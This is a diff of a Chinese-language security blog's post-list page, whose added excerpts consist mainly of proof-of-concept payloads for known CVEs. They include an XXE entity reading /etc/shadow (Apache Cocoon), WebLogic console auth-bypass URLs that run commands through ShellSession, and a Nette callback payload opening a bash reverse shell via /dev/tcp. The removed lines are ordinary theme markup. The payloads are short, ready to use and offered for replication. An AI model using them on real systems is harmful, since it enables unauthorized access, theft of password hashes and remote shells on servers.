+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--?xml version&#x3D;&quot;1.0&quot; ?--&gt;</span><br><span class="line">&lt;!DOCTYPE replace [&lt;!ENTITY ent SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;shadow&quot;&gt; ]&gt;</span><br><span class="line">&lt;userInfo&gt;</span><br><span class="line">&lt;firstName&gt;John&lt;&#x2F;firstName&gt;</span><br><span class="line">&lt;lastName&gt;&amp;ent;&lt;&#x2F;lastName&gt;</span><br><span class="line">&lt;&#x2F;userInfo&gt;</span><br></pre></td></tr></table></figure>
+            
+            <p class="more">
+                <a href="https://givemefivw.github.io/2020/12/23/CVE-2020-11991%20Apache%20Cocoon%20XML%20%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9EPOC/">阅读剩下更多</a>
+            </p>
+        </div>
+        <div class="post-thumbnail" data-img="">
+            <a href="https://givemefivw.github.io/2020/12/23/CVE-2020-11991%20Apache%20Cocoon%20XML%20%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9EPOC/" title="CVE-2020-11991 Apache Cocoon XML 外部实体注入漏洞POC">
+                
+                    <img class="thumbnail" src="/img/default.png" data-echo="/img/thumbnail/3.jpg" alt="默认配图" >
+                
+            </a>
+        </div>
+    </div>
+</article>
+
+    
+        <!-- 文章列表 item -->
+<article class="post">
+    <header>
+        <!-- 标签这有且只能显示一个 -->
+        
+            <a href="javascript: void(0);" class="cat">未分类</a>
+        
+        <!-- 文章标题 -->
+        
+    <h3 class="post-title">
+    	<a href="https://givemefivw.github.io/2020/12/21/CVE-2020-14882-CVE-2020-14883WeblogicHttpConsole%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">
+    		CVE-2020-14882&amp;CVE-2020-14883WeblogicHttpConsole权限绕过&amp;命令执行
+    	</a>
+    </h3>
+
+    </header>
+    <p class="post-meta">
+        Jelon 发表于
+        <time datetime="2020-12-21T08:16:26.000Z">2020-12-21</time>
+        &nbsp;&nbsp;
+        <span class="post-tags">
+            标签：
+            
+    
+        <a href="/tags/POC/" title="POC">POC</a>
+    
+
+        </span>
+    </p>
+
+    <div class="post-content">
+        <div class="post-excerpt">
+            
+                <h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>CVE-2020-14883通过HTTP请求绕过用户身份鉴定，对高权限的后台Console进行访问</p>
+<p>CVE-2020-14882通过高权限的后台Console进行远程命令执行</p>
+<p>两个漏洞可以组合使用，权限绕过后进行远程命令执行</p>
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Weblogic 10.3.6.0.0</span><br><span class="line"></span><br><span class="line">Weblogic 12.1.3.0.0</span><br><span class="line"></span><br><span class="line">Weblogic 12.2.1.3.0</span><br><span class="line"></span><br><span class="line">Weblogic 12.2.1.4.0</span><br><span class="line"></span><br><span class="line">Weblogic 14.1.1.0.0</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:7001&#x2F;console&#x2F;images&#x2F;%252E%252E%252Fconsole.portal?_nfpb&#x3D;true&amp;_pageLabel&#x3D;HomePage1&amp;handle&#x3D;com.tangosol.coherence.mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime().exec(%27calc.exe%27);%22);</span><br></pre></td></tr></table></figure>
+<p>更换路径的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:7001&#x2F;console&#x2F;css&#x2F;%252E%252E%252Fconsole.portal?_nfpb&#x3D;true&amp;_pageLabel&#x3D;HomePage1&amp;handle&#x3D;com.tangosol.coherence.mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime().exec(%27calc.exe%27);%22);</span><br></pre></td></tr></table></figure>
+<h4 id="权限绕过"><a href="#权限绕过" class="headerlink" title="权限绕过"></a>权限绕过</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:7001&#x2F;console&#x2F;css&#x2F;%252E%252E%252Fconsole.portal</span><br></pre></td></tr></table></figure>
+<p>访问路径即可访问后台Console</p>
+<h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_nfpb&#x3D;true&amp;_pageLabel&#x3D;HomePage1&amp;handle&#x3D;com.tangosol.coherence.mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime().exec(%27calc.exe%27);%22);</span><br></pre></td></tr></table></figure>
+            
+            <p class="more">
+                <a href="https://givemefivw.github.io/2020/12/21/CVE-2020-14882-CVE-2020-14883WeblogicHttpConsole%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">阅读剩下更多</a>
+            </p>
+        </div>
+        <div class="post-thumbnail" data-img="">
+            <a href="https://givemefivw.github.io/2020/12/21/CVE-2020-14882-CVE-2020-14883WeblogicHttpConsole%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" title="CVE-2020-14882&amp;CVE-2020-14883WeblogicHttpConsole权限绕过&amp;命令执行">
+                
+                    <img class="thumbnail" src="/img/default.png" data-echo="/img/thumbnail/1.jpg" alt="默认配图" >
+                
+            </a>
+        </div>
+    </div>
+</article>
+
+    
+        <!-- 文章列表 item -->
+<article class="post">
+    <header>
+        <!-- 标签这有且只能显示一个 -->
+        
+            <a href="javascript: void(0);" class="cat">未分类</a>
+        
+        <!-- 文章标题 -->
+        
+    <h3 class="post-title">
+    	<a href="https://givemefivw.github.io/2020/12/20/CVE-2020-15227-PHP-Framework-nette-callback-RCE-POC/">
+    		CVE-2020-15227 PHP Framework nette callback RCE POC
+    	</a>
+    </h3>
+
+    </header>
+    <p class="post-meta">
+        Jelon 发表于
+        <time datetime="2020-12-20T12:28:58.000Z">2020-12-20</time>
+        &nbsp;&nbsp;
+        <span class="post-tags">
+            标签：
+            
+    
+        <a href="/tags/POC/" title="POC">POC</a>
+    
+
+        </span>
+    </p>
+
+    <div class="post-content">
+        <div class="post-excerpt">
+            
+                <h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;nette.micro?callback&#x3D;shell_exec&amp;cmd&#x3D;bash%20-i%20&gt;&amp;%20&#x2F;dev&#x2F;tcp&#x2F;&#39;+lhost+&#39;&#x2F;&#39;+lport+&#39;0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;hu4wufu&#x2F;CVE-2020-15227</span><br></pre></td></tr></table></figure>
+            
+            <p class="more">
+                <a href="https://givemefivw.github.io/2020/12/20/CVE-2020-15227-PHP-Framework-nette-callback-RCE-POC/">阅读剩下更多</a>
+            </p>
+        </div>
+        <div class="post-thumbnail" data-img="">
+            <a href="https://givemefivw.github.io/2020/12/20/CVE-2020-15227-PHP-Framework-nette-callback-RCE-POC/" title="CVE-2020-15227 PHP Framework nette callback RCE POC">
+                
+                    <img class="thumbnail" src="/img/default.png" data-echo="/img/thumbnail/0.jpg" alt="默认配图" >
+                
+            </a>
+        </div>
+    </div>
+</article>
+
+    
+
+    
+    <nav class="page-navigator">
+        <span class="page-number current">1</span>
+    </nav>
+    
+
+
+            </div>
+
+        </section>
+        <!-- 侧栏部分 -->
+<aside class="sidebar">
+    
+    <section class="widget">
+        <h3 class="widget-hd"><strong>文章搜索</strong></h3>
+        <div class="search-form">
+  <form
+    id="searchForm"
+    method="GET"
+    action="https://www.baidu.com/s"
+    ectype="application/x-www-form-urlencoded"
+    target="_blank"
+    autocomplete="false"
+    onsubmit="javascript: return false;">
+    <input
+      id="searchKeyword"
+      type="text"
+      class="form-control"
+      placeholder="输入关键字搜索"
+      autocomplete="false"
+    />
+    <input id="searchKeywordHidden" type="hidden" name="wd" />
+    <input id="searchButton" class="btn" type="submit" value="搜索" />
+  </form>
+</div>
+    </section>
+    
+
+    <section class="widget">
+        <h3 class="widget-hd"><strong>文章分类</strong></h3>
+        <!-- 文章分类 -->
+<ul class="widget-bd">
+    
+</ul>
+    </section>
+
+    
+    <section class="widget">
+        <h3 class="widget-hd"><strong>热门标签</strong></h3>
+        <!-- 文章标签 -->
+<div class="widget-bd tag-wrap">
+  
+    <a class="tag-item" href="/tags/%E5%A4%8D%E7%8E%B0/" title="复现">复现 (4)</a>
+  
+    <a class="tag-item" href="/tags/POC/" title="POC">POC (7)</a>
+  
+    <a class="tag-item" href="/tags/%E5%85%8D%E6%9D%80%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/" title="免杀实验笔记">免杀实验笔记 (5)</a>
+  
+    <a class="tag-item" href="/tags/%E7%AC%94%E8%AE%B0/" title="笔记">笔记 (1)</a>
+  
+</div>
+    </section>
+    
+
+    
+
+    
+    <!-- 友情链接 -->
+    <section class="widget">
+        <h3 class="widget-hd"><strong>友情链接</strong></h3>
+        <!-- 文章分类 -->
+<ul class="widget-bd">
+    
+        <li>
+            <a href="https://github.com/front-end-pigs/blog" target="_blank" title="Github博客">Github博客</a>
+        </li>
+    
+        <li>
+            <a href="https://jelon.info" target="_blank" title="Jelon博客">Jelon博客</a>
+        </li>
+    
+</ul>
+    </section>
+    
+</aside>
+<!-- / 侧栏部分 -->
+    </div>
+
+    <!-- 博客底部 -->
+    <footer class="footer">
+    &copy;
+    
+        2016-2021
+    
+
+    <a href="/">Jelon Loves You</a>
+</footer>
+<div class="back-to-top" id="JELON__backToTop" title="返回顶部">返回顶部</div>
+
+    <!--博客js脚本 -->
+    <!-- 这里放网站js脚本 -->
+
+<script src="/js/main.js?v=1610591855265.js"></script>
 
 
 </body>
-
-
-<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
-<script src="/js/plugin.js"></script>
-<script src="/js/typed.js"></script>
-<script src="/js/diaspora.js"></script>
-
-
-<link rel="stylesheet" href="/photoswipe/photoswipe.css">
-<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
-
-
-<script src="/photoswipe/photoswipe.min.js"></script>
-<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
-
-
-<!-- Root element of PhotoSwipe. Must have class pswp. -->
-<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
-    <!-- Background of PhotoSwipe. 
-         It's a separate element as animating opacity is faster than rgba(). -->
-    <div class="pswp__bg"></div>
-    <!-- Slides wrapper with overflow:hidden. -->
-    <div class="pswp__scroll-wrap">
-        <!-- Container that holds slides. 
-            PhotoSwipe keeps only 3 of them in the DOM to save memory.
-            Don't modify these 3 pswp__item elements, data is added later on. -->
-        <div class="pswp__container">
-            <div class="pswp__item"></div>
-            <div class="pswp__item"></div>
-            <div class="pswp__item"></div>
-        </div>
-        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
-        <div class="pswp__ui pswp__ui--hidden">
-            <div class="pswp__top-bar">
-                <!--  Controls are self-explanatory. Order can be changed. -->
-                <div class="pswp__counter"></div>
-                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
-                <button class="pswp__button pswp__button--share" title="Share"></button>
-                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
-                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
-                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
-                <!-- element will get class pswp__preloader--active when preloader is running -->
-                <div class="pswp__preloader">
-                    <div class="pswp__preloader__icn">
-                      <div class="pswp__preloader__cut">
-                        <div class="pswp__preloader__donut"></div>
-                      </div>
-                    </div>
-                </div>
-            </div>
-            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
-                <div class="pswp__share-tooltip"></div> 
-            </div>
-            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
-            </button>
-            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
-            </button>
-            <div class="pswp__caption">
-                <div class="pswp__caption__center"></div>
-            </div>
-        </div>
-    </div>
-</div>
-
-
-
-
-
-
 </html>
